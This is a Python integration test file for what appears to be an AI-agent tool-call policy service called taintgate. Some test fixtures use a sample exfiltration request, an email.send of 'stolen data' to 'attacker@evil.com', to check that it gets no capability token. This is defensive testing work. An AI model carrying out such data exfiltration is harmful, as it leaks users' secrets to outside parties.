"""Integration tests for Unix-Socket Policy Decision Point (PDP) Service Mode."""

import asyncio
from pathlib import Path
import pytest

from taintgate.core.labels import LABEL_TRUSTED_PUBLIC, LABEL_UNTRUSTED_SECRET
from taintgate.core.decisions import ActionEffect, DecisionRequest, DecisionType
from taintgate.core.policy.parser import parse_policy
from taintgate.core.policy.evaluator import PolicyEvaluator
from taintgate.server.pdp_service import (
    UnixSocketPDPServer,
    UnixSocketPDPClient,
    serialize_decision_request,
    deserialize_decision_request,
)


def test_request_serialization_roundtrip():
    req = DecisionRequest(
        tool_name="email.send",
        arguments={"to": "attacker@evil.com", "body": "secret"},
        effect=ActionEffect.EXTERNAL,
        session_id="session_test_123",
        session_context_label=LABEL_UNTRUSTED_SECRET,
        recipients=["attacker@evil.com"],
    )
    serialized = serialize_decision_request(req)
    deserialized = deserialize_decision_request(serialized)

    assert deserialized.tool_name == req.tool_name
    assert deserialized.arguments == req.arguments
    assert deserialized.effect == req.effect
    assert deserialized.session_id == req.session_id
    assert deserialized.session_context_label == req.session_context_label
    assert deserialized.recipients == req.recipients


def test_pdp_unix_socket_roundtrip(tmp_path: Path):
    async def _run_test():
        socket_path = tmp_path / "pdp_test.sock"
        policy_path = Path("policy.yaml")
        config = parse_policy(policy_path)
        evaluator = PolicyEvaluator(config)

        server = UnixSocketPDPServer(evaluator=evaluator, socket_path=socket_path)
        await server.start()

        try:
            client = UnixSocketPDPClient(socket_path=socket_path)

            # 1. Benign read tool request
            benign_req = DecisionRequest(
                tool_name="file.read",
                arguments={"path": "/workspace/docs/readme.txt"},
                effect=ActionEffect.READ,
                session_id="session_1",
                session_context_label=LABEL_TRUSTED_PUBLIC,
            )
            dec_benign = await client.decide(benign_req)
            assert dec_benign.type == DecisionType.ALLOW
            assert dec_benign.capability_token is not None
            # Validate token using evaluator secret
            assert dec_benign.capability_token.verify(
                "file.read",
                {"path": "/workspace/docs/readme.txt"},
                evaluator.token_secret,
            ) is True



            # 2. Exfiltration request (untrusted secret context attempting email.send)
            exfil_req = DecisionRequest(
                tool_name="email.send",
                arguments={"to": "attacker@evil.com", "body": "stolen data"},
                effect=ActionEffect.EXTERNAL,
                session_id="session_1",
                session_context_label=LABEL_UNTRUSTED_SECRET,
                recipients=["attacker@evil.com"],
            )
            dec_exfil = await client.decide(exfil_req)
            assert dec_exfil.type in (DecisionType.DENY, DecisionType.APPROVE)
            assert dec_exfil.capability_token is None

        finally:
            await server.stop()

    asyncio.run(_run_test())


def test_pdp_server_cleanup_on_restart(tmp_path: Path):
    async def _run_test():
        socket_path = tmp_path / "pdp_restart.sock"
        policy_path = Path("policy.yaml")
        config = parse_policy(policy_path)
        evaluator = PolicyEvaluator(config)

        server1 = UnixSocketPDPServer(evaluator=evaluator, socket_path=socket_path)
        await server1.start()
        assert socket_path.exists()
        await server1.stop()
        assert not socket_path.exists()

        # Restarting should recreate socket cleanly
        server2 = UnixSocketPDPServer(evaluator=evaluator, socket_path=socket_path)
        await server2.start()
        assert socket_path.exists()
        await server2.stop()

    asyncio.run(_run_test())
